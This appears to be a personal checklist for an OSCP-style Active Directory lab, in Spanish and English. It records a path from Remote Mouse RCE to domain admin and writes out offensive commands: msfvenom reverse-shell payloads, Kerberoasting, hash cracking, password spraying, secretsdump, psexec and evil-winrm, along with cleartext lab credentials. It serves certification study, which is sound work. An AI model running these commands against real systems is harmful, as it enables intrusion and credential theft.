# Prepare Check List

Propietario: Adrian Gisbert Cabello

Plantilla para ir rellenando con las notas que vayamos tomando:

AD Hosts:

> 172.16.40.80 = ms01
> 

> 10.10.10.10 = ms01
> 

> 10.10.10.20 = ms02
> 

> 10.10.10.100 = dc01
> 

Things to try:

- Further enumeration of ms01 - Finding Active directory breadcrumbs
- Enumerate AD further with wyldstyle
- Kerberoasting
    - Found svc_iis and password was crackable (Portland7@)
- As-rep roasting
    - Found user metalbeard but password ≠ crackable
- Enumerate SMB with new creds (svc_iis)

Open Ports:

> ms01:
> 
> - 80/tcp = apache 2.4.56
> - 443/tcp = apache 2.4.56
> - 1978/tcp = Remote Mouse 3.008
> - 1979/tcp
> - 1980/tcp

> ms02:
> 
> - 135/tcp
> - 139/tcp
> - 445/tcp - setup share (empty, just autologon.exe file)

> dc01:
> 
> - 53/tcp
> - 445/tcp - backups share (auth denied)

Credentials:

- ms01/lucy (hash)
- oscp/wyldstyle:Awesome24!
- oscp/svc_iis:Portland7@
- oscp/emmet:R3xRul3z!

Path to Compromise:

1) Found webserver uploads directory with a .exe file

2) .exe file metadata revealed remote mouse 3.008 software

3) Remote mouse 3.008 listens on 1978/tcp and is vulnerable to unauthenticated rce

4) Exploit for Remote mouse 3.008 allowed us to download a payload and obtain a reverse shell as ms01/lucy

5) WinPEAS revealed wise boot assistance service vulnerable to an unquoted service path attack

6) Obtained a privileged reverse shell as ms01/system via the unquoted service path

7) Found wyldstyle’s credentials in powershell history on ms01

8) Found asrep and kerberoastable users; svc_iis password was crackable

9) Found an it-users.zip file on backups share from dc01

10) Cracked the password for it-users.zip with john the ripper

11) Found it-users.txt with credentials within the .zip file

12) Sprayed new creds against ms02 and dc01 and found oscp/emmet has local admin privs on ms02

13) Used impacket-secretsdump to extract creds from ms02 and found lord_business hash and password

14) Used net `user lord_business /domain` command to enumerate that lord_business is a member of DOMAIN ADMINS!!!

15) Attempt to use lord_business and evil-winrm to obtain domain admin shell on dc01

16) Con todo el AD comprometido, verificamos todos los pasos, obtenemos capturas de pantalla de todo lo que necesitemos para luego el reporte

- Crear directorios de trabajo para AD:
    - [ ]  ad_lab
        - ms01
            - enum
            - flags
            - files
            - exploits
        - ms02
            - enum
            - flags
            - files
            - exploits
        - dc01
            - enum
            - flags
            - files
            - exploits
- Escaneo de nmap
    - Escaneo básico de puertos
    
    ```jsx
    nmap -T4 -p- -v 10.10.10.10 -oN enum/nmap-ports.log
    ```
    
    - Escaneo de versiones de los puertos encontrados
    
    ```jsx
    nmap -T4 -p1,2,3... -sCV -v 10.10.10.10 -oN enum/nmap-services.log
    ```
    
- Fuzzing Web
    - Directorios:
    
    ```jsx
    gobuster dir -u [http://10.10.10.10](http://10.10.10.10) -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
    ```
    
    - Archivos:
    
    ```jsx
    gobuster dir -u [http://10.10.10.10](http://10.10.10.10/) -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,txt,html
    ```
    
    - Si encontramos archivos sospechosos podemos enumerar la metadata con `exiftool archivo.xyz`
        
        En un caso se encontró en un archivo .exe un instalador que enumerando los metadatos nos decía que era una instalación de la aplicación Remote Mouse (que tiene una vulnerabilidad y hay un exploit público)
        
- Creación de payloads
    
    Cheatsheet msfvenom payloads: [https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom)
    
    - Para Linux:
    
    ```jsx
    msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=1234 -f elf -o linrev1234.elf
    ```
    
    - Para Windows:
    
    ```jsx
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=1234 -f exe -o winrev1234.exe
    ```
    

- Obtenemos una reverse shell y tenemos control del equipo víctima
- En el momento que consigamos acceso a una máquina y encontremos el local.txt o el root.txt la metodología para reportarlo bien es hacer una captura de pantalla que salgan los siguientes comandos:
    - `cat|type local.txt | root.txt | secret.txt`
    - `hostname`
    - `whoami`
    - `ipconfig | ifconfig`
    
    ![Untitled](Prepare%20Check%20List%203f2280f0f72a44d3a274379713148bba/Untitled.png)
    

<aside>
💡 Para encontrar archivos en windows podemos usar el comando `dir /s/b local.txt` | `dir /s/b \local.txt`

- Si queremos encontrar cualquier archivo con una extensión `dir  /s/b *.log` | `dir  /s/b \*.log`
</aside>

<aside>
💡 Para enumerar todos los directorios usamos tree: `tree /f /a`

</aside>

- Enumeración AD
    - Para enumerar privilegios del usuario de la shell: `whoami /priv`
    - Para ver los usuarios del equipo: `net user`
    - Para ver los usuarios del dominio: `net user /domain`
    - Para ver los permisos que tiene un usuario: `net user lord_business /domain`
    - Para ver que grupos tienen privilegios de administrador: `net localgroup administrators`
    - Podemos descargar winpeas:
        - All Versions: https://github.com/peass-ng/PEASS-ng/releases/tag/20240609-52b58bf5
        - WinPEAS x64: https://github.com/peass-ng/PEASS-ng/releases/download/20240609-52b58bf5/winPEASx64.exe
        - WinPEAS x86:
    - Ejecutamos WinPEAS y podemos enumerar entre otras cosas:
        - Usuarios con roles de Administrador
        - Historiales de Powershell
        - Posibles explotaciones del kernel de windows (última opción)
        - Últimos usuarios logeados
        - Servicios en los que tengamos permisos de escritura
            - Si encontramos un servicio con permisos de escritura y que lo ejecuta un administrador, como en el caso de que está ejecutando WiseBootAssistant, para listar los procesos: `sc query`
            - Si luego queremos filtrar por una palabra: `sc query | findstr /i nombre`
            - Ahora si queremos ejecutar el servicio: `sc qc WiseBootAssistance`
            - Reseteamos la máquina víctima: `shutdown -r -t 1`
            - Volvemos a ponernos en escucha con netcat para recibir la reverseshell pero con el nuevo usuario Administrador (Hemos pivotado de usuario)
    - Para enumerar recursos compartidos por smb podemos usar la herramienta **smbclient**:
        - Listar directorios:
        
        ```jsx
        smbclient -L //10.10.10.20 -U oscp/wyldstyle
        ```
        
        - Ponemos la contraseña
        
        - Entrar en un directorio:
        
        ```jsx
        smbclient //10.10.10.20/setup -U oscp/wyldstyle
        ```
        
        - Ponemos la contraseña
    
    - Para hacer un ataque de Kerberoasting al DC usamos la herramienta de impacket:
        
        ```jsx
        impacket-GetUserSPNs oscp.lab/wyldstyle@10.10.10.100 -dc-ip 10.10.10.100
        ```
        
        - Ponemos la contraseña
    - También podemos mandar una request con impacket:
    
    ```jsx
    impacket-GetUserSPNs -request -dc-ip 10.10.10.100 oscp.lab/wyldstyle
    ```
    
    ![Untitled](Prepare%20Check%20List%203f2280f0f72a44d3a274379713148bba/Untitled%201.png)
    
    - Copiamos el hash entero en un archivo, `nano hashes`
    - Podemos usar otra vez el comando a ver si nos sale un nuevo usuario (as-rep kerberoasting)(ponemos el mismo comando que el anterior `impacket-GetUserSPNs -request -dc-ip 10.10.10.100 oscp.lab/wyldstyle`) y podemos probar a poner la contraeña o ponemos el hash entero en la password
        - Nos puede salir algo como esto:
        
        ![Untitled](Prepare%20Check%20List%203f2280f0f72a44d3a274379713148bba/Untitled%202.png)
        
        - Copiamos el hash y lo metemos en un archivo, `nano hashes.asrep`
        - Para crackear el hash podemos usar la herramienta **hashcat:**
            
            ```jsx
            hashcat hashes.asrep /usr/share/wordlists/rockyou.txt
            ```
            
        - Si no funciona podemos añadirle una regla de hashcat
            
            ```jsx
            hashcat hashes.asrep /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
            ```
            
        - También podemos probar con el otro hash:
            
            ```jsx
            hashcat hashes /usr/share/wordlists/rockyou.txt
            ```
            
            ![Untitled](Prepare%20Check%20List%203f2280f0f72a44d3a274379713148bba/Untitled%203.png)
            
            - s
    - Podemos enumerar credenciales validas con privilegios con la herramienta **crackmapexec:**
        - Creamos un archivo con los usuarios y otro archivo con las passwords:
        
        - users
        
        ![Untitled](Prepare%20Check%20List%203f2280f0f72a44d3a274379713148bba/Untitled%204.png)
        
        - passwords
        
        ![Untitled](Prepare%20Check%20List%203f2280f0f72a44d3a274379713148bba/Untitled%205.png)
        
        ```jsx
        crackmapexec smb 10.10.10.100 -u users -p passwords --continue-on-success
        ```
        
        ![Untitled](Prepare%20Check%20List%203f2280f0f72a44d3a274379713148bba/Untitled%206.png)
        
        - Y ahora si podemos listar el recurso backups que antes no podíamos listarlo con el nuevo usuario **svc_iis**
    
    - Si encontramos un archivo .zip que esté protegido con contraseña (por ejemplo it-users.zip) podemos crackear la contraseña con la herramienta **john the ripper**, primero sacamos el hash con `zip2john`:
        
        ```jsx
        zip2john it-users.zip
        ```
        
        Copiamos el hash o lo pasamos directamente en la herramienta a un archivo `it-users.hash`
        
        ![Untitled](Prepare%20Check%20List%203f2280f0f72a44d3a274379713148bba/Untitled%207.png)
        
        - Ahora procedemos a crackearlo con john the ripper:
        
        ```jsx
        john it-users.hash —wordlist=/usr/share/wordlists/rockyou.txt
        ```
        
        ![Untitled](Prepare%20Check%20List%203f2280f0f72a44d3a274379713148bba/Untitled%208.png)
        
        - Descomprimimos: `7z x it-users.zip` y ponemos la contraseña
    
    - Si queremos probar con crackmapexec varios usuarios y contraseñas en varias IP:
    
    ```jsx
    crackmapexec smb 10.10.10.20-10.10.10.22 -u users -p passwords -d oscp.lab --continue-on-success
    ```
    
    - Los que pongan Pwnn3d! es que son credenciales con acceso de administrador en algún equipo
    
    - Para obtener una shell interactiva cuando encontramos credenciales de administrador, usamos el módulo **psexec de impacket:**
        
        ```jsx
        impacket-psexec oscp/emmet@10.10.10.20
        ```
        
        ![Untitled](Prepare%20Check%20List%203f2280f0f72a44d3a274379713148bba/Untitled%209.png)
        
    - Si ahora hacemos un `net user lord_busines /domain` vemos que es un Domain Admin (Bingo!!!!)
    
    ![Untitled](Prepare%20Check%20List%203f2280f0f72a44d3a274379713148bba/Untitled%2010.png)
    
    - Para ver las credenciales de este usuario, además de usar mimikatz podemos usar una herramienta de impacket:
    
    ```jsx
    impacket-secretsdump oscp/emmet@10.10.10.20
    ```
    
    ![Untitled](Prepare%20Check%20List%203f2280f0f72a44d3a274379713148bba/Untitled%2011.png)
    
    - Una vez tenemos credenciales de un administrador del dominio (password o hash) podemos usar la herramienta **evil-winrm** para obtener una shell del Domain Controller con privilegios de administrador:
        - Conectarse con la contraseña:
        
        ```jsx
        evil-winrm -i 10.10.10.100 -u lord_business -p TAKOStuesday!
        ```
        
        - Conectarse con el hash:
        - evil-winrm -i 10.10.10.100 -u lord_business -H abcd1234abcd1234
    
    ![Untitled](Prepare%20Check%20List%203f2280f0f72a44d3a274379713148bba/Untitled%2012.png)
    
    - Y ya tendríamos el AD comprometido entero !!!!

Una vez hayamos comprometido la primera máquina como administrador, para pasar a la subred interna hay que pivotar (chisel/socat | ligolo)